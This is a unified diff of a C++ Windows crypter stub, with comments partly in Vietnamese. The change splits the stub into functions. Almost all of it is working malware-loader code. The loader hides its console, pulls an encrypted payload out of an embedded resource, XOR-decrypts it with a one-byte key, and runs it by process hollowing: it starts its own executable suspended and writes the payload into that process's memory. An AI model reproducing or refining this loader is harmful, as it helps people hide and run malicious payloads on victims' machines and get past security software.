@@ -1,6 +1,39 @@
 #include <iostream>
 #include <windows.h>
 
+//  HAM DE LAY RESOURCE TRA VE MANG MA HEX
+unsigned char *GetResource(int resourceId, const char *resourceString, unsigned long *dwSize);
+//  HAM GIAI MA PAYLOAD BANG XOR
+char *DecryptResource(unsigned char *resourcePtr, unsigned long resourceSize, char key, unsigned long keySize);
+//  PROCESS HOLLOWING
+bool RunPEResource(char *decryptedPE, unsigned long peSize);
+
+int main()
+{
+    // AN CUA SO CONSOLE
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    // THUC HIEN LAY PAYLOAD MA HOA DUOC NHUNG TRONG FILE
+    unsigned long dwSize;
+    unsigned char *resourcePtr = GetResource(132, "BIN", &dwSize);
+
+    // GIAI MA PAYLOAD
+    char key = 'k'; //  KEY NAY GIONG VOI KEY TRONG CRYPTER
+    unsigned long keySize = 1;
+    char *decrypted = DecryptResource(resourcePtr, dwSize, key, keySize);
+
+    bool runSuccess = RunPEResource(decrypted, dwSize);
+
+    if (!runSuccess)
+    {
+        std::cout << "Something wrong!" << std::endl;
+    }
+
+    //  GIAI PHONG BO NHO
+    delete[] decrypted;
+    return 0;
+}
+
 unsigned char *GetResource(int resourceId, const char *resourceString, unsigned long *dwSize)
 {
     HGLOBAL hResData;
@@ -22,24 +55,18 @@ unsigned char *GetResource(int resourceId, const char *resourceString, unsigned 
     return nullptr;
 }
 
-int main()
+char *DecryptResource(unsigned char *resourcePtr, unsigned long resourceSize, char key, unsigned long keySize)
 {
-    // hide console window
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-
-    // get embeded resource
-    unsigned long dwSize;
-    unsigned char *resourcePtr = GetResource(132, "BIN", &dwSize);
-
     // decrypt the resource raw data
-    char key = 'k';
-    char *decrypted = (char *)malloc(dwSize);
-    for (int i = 0; i < dwSize; i++)
+    char *decrypted = new char[resourceSize];
+    for (unsigned long i = 0; i < resourceSize; i++)
         decrypted[i] = resourcePtr[i] ^ key;
 
-    // run PE resource (process hollowing technique)
-    void *pe = decrypted;
+    return decrypted;
+}
 
+bool RunPEResource(char *decryptedPE, unsigned long peSize)
+{
     IMAGE_DOS_HEADER *DOSHeader;
     IMAGE_NT_HEADERS64 *NtHeader;
     IMAGE_SECTION_HEADER *SectionHeader;
@@ -49,10 +76,10 @@ int main()
 
     void *pImageBase;
 
-    char currentFilePath[1024];
+    char currentFilePath[MAX_PATH];
 
-    DOSHeader = PIMAGE_DOS_HEADER(pe);
-    NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);
+    DOSHeader = PIMAGE_DOS_HEADER(decryptedPE);
+    NtHeader = PIMAGE_NT_HEADERS64(DWORD64(decryptedPE) + DOSHeader->e_lfanew);
 
     if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
     {
@@ -60,7 +87,7 @@ int main()
         ZeroMemory(&SI, sizeof(SI));
 
         GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
-        // create new process for injection
+        // TAO MOT PROCESS MOI DE THUC HIEN INJECT
         if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
         {
 
@@ -77,16 +104,16 @@ int main()
                     MEM_COMMIT | MEM_RESERVE,
                     PAGE_EXECUTE_READWRITE);
 
-                WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
-                // write pe sections
+                WriteProcessMemory(PI.hProcess, pImageBase, decryptedPE, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
+                // THUC HIEN GHI CAC PE SECTIONS
                 for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                 {
-                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));
+                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(decryptedPE) + DOSHeader->e_lfanew + 264 + (i * 40));
 
                     WriteProcessMemory(
                         PI.hProcess,
                         LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),
-                        LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
+                        LPVOID(DWORD64(decryptedPE) + SectionHeader->PointerToRawData),
                         SectionHeader->SizeOfRawData,
                         NULL);
 
@@ -104,8 +131,9 @@ int main()
 
                 WaitForSingleObject(PI.hProcess, INFINITE);
 
-                return 0;
+                return true;
             }
         }
     }
+    return false;
 }
